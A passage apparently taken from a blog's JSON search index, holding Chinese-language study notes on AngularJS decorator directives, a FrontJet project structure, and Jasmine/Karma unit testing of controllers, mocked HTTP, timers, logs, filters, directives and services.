iframe、jQuery UI、Extjs、jQuery easyui，我们一直在不懈地朝着组件化的方向前进。 装饰型指令对于装饰器型指令，其定义方式则如下：123456789angular.module('com.ngnice.app').directive('twTitle', function () &#123; return &#123; // 用作属性 restrict: 'A', link: function (scope, element, attrs) &#123; ... &#125; &#125;;&#125;); 装饰器型指令主要用于添加行为和保持 View 和 Model 的同步，所以它不同于组件型指令，经常需要进行 DOM 操作。其 restrict 属性通常为 A，也就是属性声明方式，这种方式更符合装饰器的语义：它并不是一个内容的主体，而是附加行为能力的连接器。 同时，由于多个装饰器很可能被用于同一个指令，包括独立作用域指令，所以装饰器型指令通常不使用新作用域或独立作用域。如果要访问绑定属性，该怎么做呢？仍然看前面的例子 &lt;user-details name=&quot;test&quot; details=&quot;details&quot; on-update=&quot;updateIt(times)&quot;&gt;&lt;/user-details&gt;，假如不使用独立作用域，该如何获取这些属性的值呢？ 对于 @ 型的绑定，可以直接通过 attrs 取到它：attrs.name 等价于 name: &#39;@&#39;。 对于 = 型的绑定，我们可以通过 scope.$eval 取到它：scope.$eval(attrs.details) 等价于 details: &#39;=&#39;。 对于 &amp; 型的绑定，由代码：scope.$eval(attrs.onUpdate, {times: 3}); 和 = 型绑定一样，onUpdate 属性在本质上是当前 scope 上的一个表达式。特殊的地方在于，这个表达式是一个函数，$eval 发现它是函数时，就可以传一个参数表（在 Angular中称之为 locals）给它。onUpdate 表达式中可以使用的参数名和它的参数值，都来自这个参数表。 使用的时候，可以在视图中引用这个哈希对象的某个属性作为参数，比如对于刚才的定义，视图中的 on-update=”updateIt(times)” 所引用的 times 变量就来自我们刚才在callback 中传入的 times 属性，而 updateIt 函数被调用时将会接收到它，参数值是 3。123$scope.updateIt = function(times) &#123; // 这里times的值应该是3，但是这个times不需要跟视图和指令中的名称一致，它叫什么都可以。但视图和指令中的名称必须一致&#125;; 在装饰器指令中，其实还有一种细分的分支，它完全不操纵 DOM，只是对当前 scope进行处理，如添加成员变量、函数等。代码如下：1234567891011121314angular.module('com.ngnice.app').directive('twToggle', function () &#123; return &#123; restrict: 'A', scope: true, link: function(scope) &#123; scope.$node = &#123; folded: false, toggle: function() &#123; this.folded = !this.folded; &#125; &#125;; &#125; &#125;;&#125;); 使用：12345678&lt;ul&gt; &lt;li ng-repeat=\"item in items\" tw-toggle=\"\"&gt; &lt;span ng-click=\"$node.toggle()\"&gt;切换&lt;/span&gt; &lt;ul ng-if=\"$node.folded\"&gt; ... &lt;/ul&gt; &lt;/li&gt;&lt;/ul&gt; 它的作用是在当前元素的作用域上创建一个名为 $node 的哈希对象，这个哈希对象具有一组自定义的属性和方法，可用来封装交互逻辑。上面的代码可以改进为：123456789101112angular.module('com.ngnice.app').directive('twToggle', function () &#123; return &#123; restrict: 'A', scope: true, controller: function($scope) &#123; $scope.folded = false; $scope.toggle = function() &#123; $scope.folded = !$scope.folded; &#125;; &#125; &#125;;&#125;); 好处是显示指定指令控制器，而不是通过link函数隐式生成控制器。","categories":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/categories/angularjs/"}],"tags":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/tags/angularjs/"}]},{"title":"angularjs巩固实践-28-需求分析","slug":"angularjs28","date":"2017-07-20T08:28:41.000Z","updated":"2017-12-06T14:50:08.899Z","comments":true,"path":"2017/07/20/angularjs28/","link":"","permalink":"https://github.com/xmoyKING/2017/07/20/angularjs28/","excerpt":"","text":"从本节开始，学习《AngularJS深度剖析与最佳实践》， 主要对前面的学习进行巩固加强，深入理解概念，同时记录一些最佳实践和技巧。 实例是一个小论坛系统，用于读者相互交流。从前端到后台，后台采用Java，业务目标，即一个明确的功能列表，不仅包括“要做什么”，还要包含“不做什么”，防止“需求蔓延”。 同时展示使用FrontJet初始化一个ng项目的组织结构应该是怎么样的，FrontJet是一个基于node的前端工具集, FrontJet 的安装非常简单，使用 cnpm install -g fj 即可, fj 是 FrontJet 的缩写, 它主要有以下亮点： 可独立安装、升级。 去掉了很多选项，直接选用经过实践检验的固定技术栈，简化创建过程。 自带一个种子工程，里面包含根据实战经验总结出来的目录结构和开发指南，可用于创建新工程。 自动注入项目中的 JavaScript 文件和 Scss 文件，引入 JavaScript 文件时会加上charset=”utf-8” 选项。 对文件进行增删改时都能正常触发 reload。 增加编译 Web font 的功能，即把一个 svg 文件放入 icons 目录，就会自动编译成font 文件（ttf、woff 等），以及相应的 Scss 文件。 增加 Forks 功能，可生成针对不同操作系统的文件，开发服务器会根据浏览器所在的操作系统返回相应分支下的文件，这特别适合于手机版调试。 增加 Mock 功能，基于 node-restify 库，生成一个内置的 Mock 服务器，可在与真实服务端对接之前提供一个模拟服务器。这些 Mock 数据也会被自动用于单元测试。 增加内置的启动为 https 服务的功能，可用于排查 https 的特有问题。 增加针对特定 URL 的反向代理、模拟延迟功能。反向代理虽然在 gulp-angular 中也有实现，不过比较粗糙，需要修改 gulp 源码才能工作，将其移到 fj.conf.js 中。模拟延迟则用于模拟真实环境中的网络延迟，以便设计更好的用户体验。 在 Linux/Mac 下增加了系统级错误提示框：当 FrontJet 编译过程中发现语法错误时，会通过系统本身的通知功能显示一个错误提示框，以免被忽略。 这个结构中有很多 README.md 文件，用于解释当前目录的结构以及用途，它们不会出现在编译结果中，并且可以随意删除。也可以自行编辑它，用于在项目组中保持共识。 本项目的结构简介如下： |– app（源码的根目录）| |– animations（自定义动画）| | |– README.md| | -- ease.js（动画样例） | |-- app.js（app模块的定义文件） | |-- components（组件型指令） | | |-- README.md | |– layout（外框架）| | |– _layout.html（模板）| | |– _layout.js（控制器）| | |– _layout.test.js（与控制器对应的单元测试）| | |– _layout.scss（样式）| | |– footer.html| | |– footer.js| | |– footer.scss| | |– header.html| | |– header.js| | |– header.scss| | |– menu.html| | |– menu.js| | -- menu.scss | |-- configs（配置） | | |-- README.md | | |-- config.js（config阶段的代码） | | |-- router.js（路由定义） | |– run.js（run阶段的代码）| |– consts（常量）| | |– README.md| | -- api.js（API定义） | |-- controllers（控制器） | | |-- README.md | |– home（首页）| | |– index.html（模板）| | |– index.js（控制器）| | |– index.scss（样式）| | |– notFound.html（模板）| | |– notFound.js（控制器）| | -- notFound.scss（样式） | |-- decorators（装饰器型指令） | |– README.md| |– favicon.ico（网站图标）| |– filters（过滤器）| | -- README.md | |-- forks（系统分支） | | |-- README.md | | |-- android（适用于安卓浏览器的文件） | | |– README.md| | |– default（适用于其他系统的文件）| | | -- README.md | |– ios（适用于iOS浏览器的文件）| | -- README.md | |-- icons（svg图标源文件） | |– README.md| |– images（普通图片）| | |– README.md| | -- logo.png | |-- index.html（首页） | |-- libraries（第三方非Angular库、非bower文件，会被最先引用） | |– README.md| |– services（服务）| | |– interceptors（拦截器，用于过滤通过Ajax上传或下载的数据）| | | |– AuthHandler.js（401的处理器）| | | |– ErrorHandler.js（其他4xx、5xx错误码的处理器）| | | |– LoadingHandler.js（加载中界面）| | | -- README.md | | |-- sao（服务访问对象） | | |– README.md| | -- utils（工具类服务） | |– README.md| -- styles（样式定义） | |-- README.md | |-- _app.scss（应用程序的定义，自动引入所有具体页面的Scss) | |-- _bootstrap.scss（对Bootstrap的样式重定义） | |-- _common.scss（具有跨项目复用价值的样式） | |-- _icons.scss（根据svg图标编译出的样式文件） | |-- _variables.scss（变量定义，包括对Bootstrap的覆盖式样式定义） |– main.scss（总的CSS文件，用于依次引入其他文件，一般不在此处定义样式）|– bower.json（bower库的名称及版本列表）|– bower_components（bower库文件）|– dist（编译结果/供最终发布的文件）|– fj.conf.js（FrontJet的配置文件，详情见注释）|– mock（Mock服务器）| |– README.md| |– package.json| |– resources（资源数据定义）| | -- users.js | |-- routers（服务端路由实现） | |– users.js| |– routers.js（路由列表）| |– server.js（服务器启动文件）| -- utils（工具类） |– resourceMixin.js|– test（测试）| |– e2e（端到端测试）| | |– demo.js| | -- readme.md | |-- karma.conf.js（Karma的配置文件，用于单元测试） | |-- protractor.conf.js（Protractor的配置文件，用于端到端测试） |– unit（单元测试）| -- readme.md |-- .bowerrc（bower的配置文件，用于指定bower路径等） |-- .editorconfig（编辑器配置，用于在不同的编辑器之间统一缩进等代码风格） |-- .gitignore（Git的忽略列表，匹配的不会被添加到Git库中） |-- .jshintrc（JavaScript代码风格检查工具jshint的配置文件，用于定制代码检查规则） |-- tsd.json（第三方库名称及版本列表）– typings（第三方库定义） 其中 app 目录的内部结构都是可以任意调整的，不会影响 FrontJet 的运行。当要对传统项目使用 FrontJet 时，可以将其源文件拷贝到 app 目录下。","categories":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/categories/angularjs/"}],"tags":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/tags/angularjs/"}]},{"title":"angularjs入门笔记-27-单元测试2","slug":"angularjs27","date":"2017-07-18T05:52:40.000Z","updated":"2017-12-06T14:50:08.899Z","comments":true,"path":"2017/07/18/angularjs27/","link":"","permalink":"https://github.com/xmoyKING/2017/07/18/angularjs27/","excerpt":"","text":"接上一个”单元测试1”的内容： 仿造定时$interval和$timeout仿造服务定义的方法能明确的触发由测试代码注册的回调函数。 flush(millisecond) 使计时器快进的毫秒数，$timeout和$interval服务都提供此方法 verifyNoPendingTasks() 查看是否还有未被调用的回调函数，仅$timeout服务提供此方法 在app.js中添加定时：123456789101112131415161718192021222324angular.module(\"exampleApp\", []) .controller(\"defaultCtrl\", function ($scope, $http, $interval, $timeout) &#123; $scope.intervalCounter = 0; $scope.timerCounter = 0; $interval(function () &#123; $scope.intervalCounter++; &#125;, 5000, 10); $timeout(function () &#123; $scope.timerCounter++; &#125;, 5000); $http.get(\"productData.json\").success(function (data) &#123; $scope.products = data; &#125;); $scope.counter = 0; $scope.incrementCounter = function() &#123; $scope.counter++; &#125; &#125;); 在controllerTest.js添加测试:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566describe(\"Controller Test\", function () &#123; // Arrange var mockScope, controller, backend, mockInterval, mockTimeout; beforeEach(angular.mock.module(\"exampleApp\")); beforeEach(angular.mock.inject(function ($httpBackend) &#123; backend = $httpBackend; backend.expect(\"GET\", \"productData.json\").respond( [&#123; \"name\": \"Apples\", \"category\": \"Fruit\", \"price\": 1.20 &#125;, &#123; \"name\": \"Bananas\", \"category\": \"Fruit\", \"price\": 2.42 &#125;, &#123; \"name\": \"Pears\", \"category\": \"Fruit\", \"price\": 2.02 &#125;]); &#125;)); // 1.准备定时器测试预设参数 beforeEach(angular.mock.inject(function ($controller, $rootScope, $http, $interval, $timeout) &#123; mockScope = $rootScope.$new(); mockInterval = $interval; mockTimeout = $timeout; $controller(\"defaultCtrl\", &#123; $scope: mockScope, $http: $http, $interval: mockInterval, $timeout: mockTimeout &#125;); backend.flush(); &#125;)); // Act and Assess it(\"Creates variable\", function () &#123; expect(mockScope.counter).toEqual(0); &#125;) it(\"Increments counter\", function () &#123; mockScope.incrementCounter(); expect(mockScope.counter).toEqual(1); &#125;); it(\"Makes an Ajax request\", function () &#123; backend.verifyNoOutstandingExpectation(); &#125;); it(\"Processes the data\", function () &#123; expect(mockScope.products).toBeDefined(); expect(mockScope.products.length).toEqual(3); &#125;); it(\"Preserves the data order\", function () &#123; expect(mockScope.products[0].name).toEqual(\"Apples\"); expect(mockScope.products[1].name).toEqual(\"Bananas\"); expect(mockScope.products[2].name).toEqual(\"Pears\"); &#125;); // 2.执行 it(\"Limits interval to 10 updates\", function () &#123; for (var i = 0; i &lt; 11; i++) &#123; mockInterval.flush(5000); &#125; expect(mockScope.intervalCounter).toEqual(10); &#125;); it(\"Increments timer counter\", function () &#123; mockTimeout.flush(5000); expect(mockScope.timerCounter).toEqual(1); &#125;);&#125;); 测试日志$log仿造服务对日志信息进行跟踪，并通过它测试单元代码是否记录正确的信息。修改app.js，每当$interval服务所注册的回调函数被调用时就记录信息,使用$log仿造服务确定日志消息的数量正确：12345678910111213141516171819202122232425angular.module(\"exampleApp\", []) .controller(\"defaultCtrl\", function ($scope, $http, $interval, $timeout, $log) &#123; $scope.intervalCounter = 0; $scope.timerCounter = 0; $interval(function () &#123; $scope.intervalCounter++; &#125;, 5, 10); $timeout(function () &#123; $scope.timerCounter++; &#125;, 5); $http.get(\"productData.json\").success(function (data) &#123; $scope.products = data; $log.log(\"There are \" + data.length + \" items\"); &#125;); $scope.counter = 0; $scope.incrementCounter = function() &#123; $scope.counter++; &#125; &#125;); 当控制器工厂函数接收ajax响应时，它就会向$log.log方法写入信息，在单元测试中，读取$log.log.logs数组，其保存着$log.log写入的信息。修改后的controllerTest.js内容：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273describe(\"Controller Test\", function () &#123; // Arrange var mockScope, controller, backend, mockInterval, mockTimeout, mockLog; beforeEach(angular.mock.module(\"exampleApp\")); beforeEach(angular.mock.inject(function ($httpBackend) &#123; backend = $httpBackend; backend.expect(\"GET\", \"productData.json\").respond( [&#123; \"name\": \"Apples\", \"category\": \"Fruit\", \"price\": 1.20 &#125;, &#123; \"name\": \"Bananas\", \"category\": \"Fruit\", \"price\": 2.42 &#125;, &#123; \"name\": \"Pears\", \"category\": \"Fruit\", \"price\": 2.02 &#125;]); &#125;)); beforeEach(angular.mock.inject(function ($controller, $rootScope, $http, $interval, $timeout, $log) &#123; mockScope = $rootScope.$new(); mockInterval = $interval; mockTimeout = $timeout; mockLog = $log; $controller(\"defaultCtrl\", &#123; $scope: mockScope, $http: $http, $interval: mockInterval, $timeout: mockTimeout, $log: mockLog &#125;); backend.flush(); &#125;)); // Act and Assess it(\"Creates variable\", function () &#123; expect(mockScope.counter).toEqual(0); &#125;) it(\"Increments counter\", function () &#123; mockScope.incrementCounter(); expect(mockScope.counter).toEqual(1); &#125;); it(\"Makes an Ajax request\", function () &#123; backend.verifyNoOutstandingExpectation(); &#125;); it(\"Processes the data\", function () &#123; expect(mockScope.products).toBeDefined(); expect(mockScope.products.length).toEqual(3); &#125;); it(\"Preserves the data order\", function () &#123; expect(mockScope.products[0].name).toEqual(\"Apples\"); expect(mockScope.products[1].name).toEqual(\"Bananas\"); expect(mockScope.products[2].name).toEqual(\"Pears\"); &#125;); it(\"Limits interval to 10 updates\", function () &#123; for (var i = 0; i &lt; 11; i++) &#123; mockInterval.flush(5000); &#125; expect(mockScope.intervalCounter).toEqual(10); &#125;); it(\"Increments timer counter\", function () &#123; mockTimeout.flush(5000); expect(mockScope.timerCounter).toEqual(1); &#125;); it(\"Writes log messages\", function () &#123; expect(mockLog.log.logs.length).toEqual(1); &#125;);&#125;); 除了$log.log方法，$log服务还定义了如下两个方法： assertEmpty() 检测是否为空，任何日志的写入都会导致异常 reset() 清楚存储的信息 测试过滤器向app.js中添加过滤器：123456789101112131415161718192021222324252627282930313233343536angular.module(\"exampleApp\", []) .controller(\"defaultCtrl\", function ($scope, $http, $interval, $timeout, $log) &#123; $scope.intervalCounter = 0; $scope.timerCounter = 0; $interval(function () &#123; $scope.intervalCounter++; &#125;, 5, 10); $timeout(function () &#123; $scope.timerCounter++; &#125;, 5); $http.get(\"productData.json\").success(function (data) &#123; $scope.products = data; $log.log(\"There are \" + data.length + \" items\"); &#125;); $scope.counter = 0; $scope.incrementCounter = function() &#123; $scope.counter++; &#125; &#125;) .filter(\"labelCase\", function () &#123; return function (value, reverse) &#123; if (angular.isString(value)) &#123; var intermediate = reverse ? value.toUpperCase() : value.toLowerCase(); return (reverse ? intermediate[0].toLowerCase() : intermediate[0].toUpperCase()) + intermediate.substr(1); &#125; else &#123; return value; &#125; &#125;; &#125;); 然后在tests/filterTest.js中创建测试过滤器的测试用例：123456789101112131415161718192021describe(\"Filter Tests\", function () &#123; // 1.定义一个变量，用于保存$filter服务实例 var filterInstance; beforeEach(angular.mock.module(\"exampleApp\")); // 2.用inject方法获取$filter服务实例，将其赋值给filterInstance beforeEach(angular.mock.inject(function ($filter) &#123; filterInstance = $filter(\"labelCase\"); &#125;)); // 3.执行测试并比对结果 it(\"Changes case\", function () &#123; var result = filterInstance(\"test phrase\"); expect(result).toEqual(\"Test phrase\"); &#125;); it(\"Reverse case\", function () &#123; var result = filterInstance(\"test phrase\", true); expect(result).toEqual(\"tEST PHRASE\"); &#125;);&#125;); 测试指令由于指令可修改DOM结构，所以测试指令比较不一样，需要依赖jqLite和$complie服务。在app.js中添加指令，该指令用于生成一个无序列表ul123456789101112131415161718192021222324252627282930313233343536373839404142434445464748angular.module(\"exampleApp\", []) .controller(\"defaultCtrl\", function ($scope, $http, $interval, $timeout, $log) &#123; $scope.intervalCounter = 0; $scope.timerCounter = 0; $interval(function () &#123; $scope.intervalCounter++; &#125;, 5, 10); $timeout(function () &#123; $scope.timerCounter++; &#125;, 5); $http.get(\"productData.json\").success(function (data) &#123; $scope.products = data; $log.log(\"There are \" + data.length + \" items\"); &#125;); $scope.counter = 0; $scope.incrementCounter = function () &#123; $scope.counter++; &#125; &#125;) .filter(\"labelCase\", function () &#123; return function (value, reverse) &#123; if (angular.isString(value)) &#123; var intermediate = reverse ? value.toUpperCase() : value.toLowerCase(); return (reverse ? intermediate[0].toLowerCase() : intermediate[0].toUpperCase()) + intermediate.substr(1); &#125; else &#123; return value; &#125; &#125;; &#125;) .directive(\"unorderedList\", function () &#123; return function (scope, element, attrs) &#123; var data = scope[attrs[\"unorderedList\"]]; if (angular.isArray(data)) &#123; var listElem = angular.element(\"&lt;ul&gt;\"); element.append(listElem); for (var i = 0; i &lt; data.length; i++) &#123; listElem.append(angular.element('&lt;li&gt;').text(data[i].name)); &#125; &#125; &#125; &#125;); 在tests/directiveTest.js中添加测试指令的代码：1234567891011121314151617181920212223242526272829describe(\"Directive Tests\", function () &#123; // 1.定义变量，用于保存作用域和$compile服务实例 var mockScope; var compileService; beforeEach(angular.mock.module(\"exampleApp\")); // 2.获取作用域及$compile服务实例,并在作用域中添加data模拟数据 beforeEach(angular.mock.inject(function($rootScope, $compile) &#123; mockScope = $rootScope.$new(); compileService = $compile; mockScope.data = [ &#123; name: \"Apples\", category: \"Fruit\", price: 1.20, expiry: 10 &#125;, &#123; name: \"Bananas\", category: \"Fruit\", price: 2.42, expiry: 7 &#125;, &#123; name: \"Pears\", category: \"Fruit\", price: 2.02, expiry: 6 &#125;]; &#125;)); // 3.执行测试，并用jqLite的方式获取列表内容，然后对比 it(\"Generates list elements\", function () &#123; var compileFn = compileService(\"&lt;div unordered-list='data'&gt;&lt;/div&gt;\"); var elem = compileFn(mockScope); expect(elem.children(\"ul\").length).toEqual(1); expect(elem.find(\"li\").length).toEqual(3); expect(elem.find(\"li\").eq(0).text()).toEqual(\"Apples\"); expect(elem.find(\"li\").eq(1).text()).toEqual(\"Bananas\"); expect(elem.find(\"li\").eq(2).text()).toEqual(\"Pears\"); &#125;);&#125;); 测试服务由于通过inject方法获取服务很方便，所以测试服务很简单.在app.js中添加一个简单的服务，该服务很简单，维护计数器并定义了两个方法，用于增加和返回计数。1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859angular.module(\"exampleApp\", []) .controller(\"defaultCtrl\", function ($scope, $http, $interval, $timeout, $log) &#123; $scope.intervalCounter = 0; $scope.timerCounter = 0; $interval(function () &#123; $scope.intervalCounter++; &#125;, 5, 10); $timeout(function () &#123; $scope.timerCounter++; &#125;, 5); $http.get(\"productData.json\").success(function (data) &#123; $scope.products = data; $log.log(\"There are \" + data.length + \" items\"); &#125;); $scope.counter = 0; $scope.incrementCounter = function () &#123; $scope.counter++; &#125; &#125;) .filter(\"labelCase\", function () &#123; return function (value, reverse) &#123; if (angular.isString(value)) &#123; var intermediate = reverse ? value.toUpperCase() : value.toLowerCase(); return (reverse ? intermediate[0].toLowerCase() : intermediate[0].toUpperCase()) + intermediate.substr(1); &#125; else &#123; return value; &#125; &#125;; &#125;) .directive(\"unorderedList\", function () &#123; return function (scope, element, attrs) &#123; var data = scope[attrs[\"unorderedList\"]]; if (angular.isArray(data)) &#123; var listElem = angular.element(\"&lt;ul&gt;\"); element.append(listElem); for (var i = 0; i &lt; data.length; i++) &#123; listElem.append(angular.element('&lt;li&gt;').text(data[i].name)); &#125; &#125; &#125; &#125;) .factory(\"counterService\", function () &#123; var counter = 0; return &#123; incrementCounter: function () &#123; counter++; &#125;, getCounter: function() &#123; return counter; &#125; &#125; &#125;); 在tests/serviceTest.js中添加对服务的单元测试代码：123456789101112describe(\"Service Tests\", function () &#123; beforeEach(angular.mock.module(\"exampleApp\")); it(\"Increments the counter\", function () &#123; angular.mock.inject(function (counterService) &#123; expect(counterService.getCounter()).toEqual(0); counterService.incrementCounter(); expect(counterService.getCounter()).toEqual(1); &#125;); &#125;);&#125;);","categories":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/categories/angularjs/"}],"tags":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/tags/angularjs/"},{"name":"jasmine","slug":"jasmine","permalink":"https://github.com/xmoyKING/tags/jasmine/"}]},{"title":"angularjs入门笔记-26-单元测试1","slug":"angularjs26","date":"2017-07-15T01:17:43.000Z","updated":"2017-12-06T14:50:08.899Z","comments":true,"path":"2017/07/15/angularjs26/","link":"","permalink":"https://github.com/xmoyKING/2017/07/15/angularjs26/","excerpt":"","text":"单元测试能让ng从框架中分离代码，为完整测试提供支持。 使用Jasmine的describe、befireEach、it和expect函数写基本的单元测试 使用angular.mock.module方法载入待测模块，使用angular.mock.inject方法解决依赖 在ngMocks模块中使用$httpBackend服务，仿造HTTP请求 在ngMocks模块中使用$interval和$timeout服务,仿造超时和间隔 在ngMocks模块中使用$log服务，测试日志 使用$filter服务实例化过滤器，测试过滤器 使用$compile服务生成一个函数，该函数传入作用域参数可生成能使用jqLite的HTML，测试指令 使用angular.mock.inject方法解决被测试服务的依赖，测试服务 关于Karma的一些问题：Karma内置了三种流行的测试框架：Jasmine、Mocha和QUnit,可以检测文件变化并在浏览器中自动执行测试代码。每一个项目都需配置并初始化后使用karma：1karma init karma.config.js karma.config.js的内容为：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071// Karma configuration// Generated on Sun Dec 01 2013 16:50:31 GMT+0000 (GMT Standard Time)module.exports = function(config) &#123; config.set(&#123; // base path, that will be used to resolve files and exclude basePath: '', // frameworks to use frameworks: ['jasmine'], // list of files / patterns to load in the browser files: [ 'angular.js', 'angular-mocks.js', '*.js', 'tests/*.js' ], // list of files to exclude exclude: [ ], // test results reporter to use // possible values: 'dots', 'progress', 'junit', 'growl', 'coverage' reporters: ['progress'], // web server port port: 9876, // enable / disable colors in the output (reporters and logs) colors: true, // level of logging // possible values: config.LOG_DISABLE || config.LOG_ERROR || config.LOG_WARN || config.LOG_INFO || config.LOG_DEBUG logLevel: config.LOG_INFO, // enable / disable watching file and executing tests whenever any file changes autoWatch: true, // Start these browsers, currently available: // - Chrome // - ChromeCanary // - Firefox // - Opera (has to be installed with `npm install karma-opera-launcher`) // - Safari (only Mac; has to be installed with `npm install karma-safari-launcher`) // - PhantomJS // - IE (only Windows; has to be installed with `npm install karma-ie-launcher`) browsers: ['Chrome'], // If browser does not capture in given timeout [ms], kill it captureTimeout: 60000, // Continuous Integration mode // if true, it capture browsers, run tests and exit singleRun: false &#125;);&#125;; 测试示例创建一个app.html,效果为点击按钮计数增加，下例使用Jasmine作为测试框架。1234567891011121314151617181920&lt;html ng-app=\"exampleApp\"&gt;&lt;head&gt; &lt;title&gt;Example&lt;/title&gt; &lt;script src=\"angular.js\"&gt;&lt;/script&gt; &lt;script src=\"app.js\"&gt;&lt;/script&gt; &lt;link href=\"bootstrap.css\" rel=\"stylesheet\" /&gt; &lt;link href=\"bootstrap-theme.css\" rel=\"stylesheet\" /&gt;&lt;/head&gt;&lt;body ng-controller=\"defaultCtrl\"&gt; &lt;div class=\"panel panel-default\"&gt; &lt;div class=\"panel-body\"&gt; &lt;p&gt;Counter: &#123;&#123;counter&#125;&#125;&lt;/p&gt; &lt;p&gt; &lt;button class=\"btn btn-primary\" ng-click=\"incrementCounter()\"&gt;Increment&lt;/button&gt; &lt;/p&gt; &lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; app.js123456789angular.module(\"exampleApp\", []) .controller(\"defaultCtrl\", function ($scope) &#123; $scope.counter = 0; $scope.incrementCounter = function() &#123; $scope.counter++; &#125; &#125;); 在tests文件夹中添加一个test.js文件：1234567891011121314151617181920212223describe(\"First Test\", function () &#123; // Arrange (set up a scenario) var counter; beforeEach(function () &#123; counter = 0; &#125;); it(\"increments value\", function () &#123; // 测试通过 // Act (attempt the operation) counter++; // Assert (verify the result) expect(counter).toEqual(1); &#125;) it(\"decrements value\", function () &#123; // 测试失败 // Act (attempt the operation) counter--; // Assert (verify the result) expect(counter).toEqual(0); &#125;)&#125;); 写单元测试时，流程为 arrange/act/assert A/A/A模式 (准备/行动/断言) ，准备是指设置测试所需的一些变量或预置值，行动是指执行测试，断言是指检查结果确保正确性。 Jasmine测试使用js函数，提供如下的方法： describe 可选，将测试分组，利用组织测试代码 beforeEach 在测试前执行的函数，即准备阶段 it 执行函数测试，即行动阶段 expect 识别测试结果，即断言阶段的第一部分 toEqual 比较结果和期望值是否相等，断言阶段的第二部分 其中用于评估结果的函数很多，不止toEqual一种，还有如下一些方法： expect(x).toEqual(val) 断言x与val值相当（不需要是同一对象） expect(x).toBe(obj) 断言x与obj是同一个对象 expect(x).toMatch(reg) 断言x匹配指定的正则表达式 expect(x).toBeDefined() 断言x已定义 expect(x).toBeUndefined() 断言x未定义 expect(x).toBeNull() 断言x是null expect(x).toBeTruthy() 断言x是true或等价于true expect(x).toBeFalsy() 断言x是false或等价于false expect(x).toContain(y) 断言x是包含y的字符串 expect(x).toBeGreaterThan(y) 断言x大于y expect(x).not.toEqual(val) 断言x与val值不同，即加上not表示与后面的判断相反 仿造对象仿造（mocking）是创建在应用中替换关键组件对象的过程，以此进行单元测试，比如，需要测试使用$http服务发出ajax请求的控制器行为，该行为依赖其他组件和系统，控制器所属的ng模块、$http服务、处理请求的服务、数据库。一旦测试失败，却没办法直接定位到问题的源头，因为导致失败的地方很多，有可能是数据库，也有可能是$http服务，也有可能是处理请求的问题。 此时测试就非常艰难，所以需要将这些依赖组件替换为仿造对象（mock object），这些仿造对象实现所需组件的API，生成仿造的、预计的结果，无需重新配置测试服务器，数据库，网络，可以快捷的改变仿造对象来测试不同场景下的使用情况。 ngMock模块包含的仿造对象： angular.mock 用于创建仿造模块并解决依赖。 $exceptionHandler 仿造$exceptionHandler服务，抛出异常 $interval 仿造$interval服务 $timeout 仿造$timeout，直接触发预计函数 $log 仿造$log 测试控制器angular.mock对象定义的方法： module(name) 载入name模块 inject(fn) 解决依赖并注入 dump(object) 序列化ng对象（如服务对象） 除了angular.mock，ng还提供了一些其他方法和服务用于单元测试 $rootScope.new() 创建新作用域 $controller(name) 创建指定控制器的实例 $filter(name) 创建指定过滤器的实例 如下的tests/controllerTest.js内容，用于测试控制器：12345678910111213141516171819202122232425describe(\"Controller Test\", function () &#123; // Arrange var mockScope = &#123;&#125;; var controller; // 1.准备包含控制器的模块，一个简写的方式是：beforeEach(module(\"exampleApp\")); beforeEach(angular.mock.module(\"exampleApp\")); // 2.解决依赖，并注入服务，将作用域设置为mockScope beforeEach(angular.mock.inject(function ($controller, $rootScope) &#123; mockScope = $rootScope.$new(); controller = $controller(\"defaultCtrl\", &#123; $scope: mockScope &#125;); &#125;)); // 3.执行测试并对比结果 // Act and Assess it(\"Creates variable\", function () &#123; expect(mockScope.counter).toEqual(0); &#125;) it(\"Increments counter\", function () &#123; mockScope.incrementCounter(); expect(mockScope.counter).toEqual(1); &#125;);&#125;); 仿造HTTP响应$httpBackend服务提供底层API用于$http服务产生ajax请求（也可用于$resource服务，其反依赖于$http）. $httpBackend仿造服务包含于ngMocks模块中，使用流程很简单 定义期望的请求及其响应 发送响应 检测所有已产生的请求 评估结果 在app.js中添加ajax请求：12345678910111213angular.module(\"exampleApp\", []) .controller(\"defaultCtrl\", function ($scope, $http) &#123; $http.get(\"productData.json\").success(function (data) &#123; $scope.products = data; &#125;); $scope.counter = 0; $scope.incrementCounter = function() &#123; $scope.counter++; &#125; &#125;); 然后修改controllerTest.js，用于测试ajax请求：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253describe(\"Controller Test\", function () &#123; // Arrange var mockScope, controller, backend; beforeEach(angular.mock.module(\"exampleApp\")); beforeEach(angular.mock.inject(function ($httpBackend) &#123; backend = $httpBackend; // 1. 定义期望的请求及其响应 backend.expect(\"GET\", \"productData.json\").respond( [&#123; \"name\": \"Apples\", \"category\": \"Fruit\", \"price\": 1.20 &#125;, &#123; \"name\": \"Bananas\", \"category\": \"Fruit\", \"price\": 2.42 &#125;, &#123; \"name\": \"Pears\", \"category\": \"Fruit\", \"price\": 2.02 &#125;]); &#125;)); beforeEach(angular.mock.inject(function ($controller, $rootScope, $http) &#123; mockScope = $rootScope.$new(); $controller(\"defaultCtrl\", &#123; $scope: mockScope, $http: $http &#125;); // 2. 发送响应 backend.flush(); &#125;)); // Act and Assess it(\"Creates variable\", function () &#123; expect(mockScope.counter).toEqual(0); &#125;) it(\"Increments counter\", function () &#123; mockScope.incrementCounter(); expect(mockScope.counter).toEqual(1); &#125;); // 3. 检测所有已产生的请求 it(\"Makes an Ajax request\", function () &#123; backend.verifyNoOutstandingExpectation(); &#125;); // 4. 评估结果 it(\"Processes the data\", function () &#123; expect(mockScope.products).toBeDefined(); expect(mockScope.products.length).toEqual(3); &#125;); it(\"Preserves the data order\", function () &#123; expect(mockScope.products[0].name).toEqual(\"Apples\"); expect(mockScope.products[1].name).toEqual(\"Bananas\"); 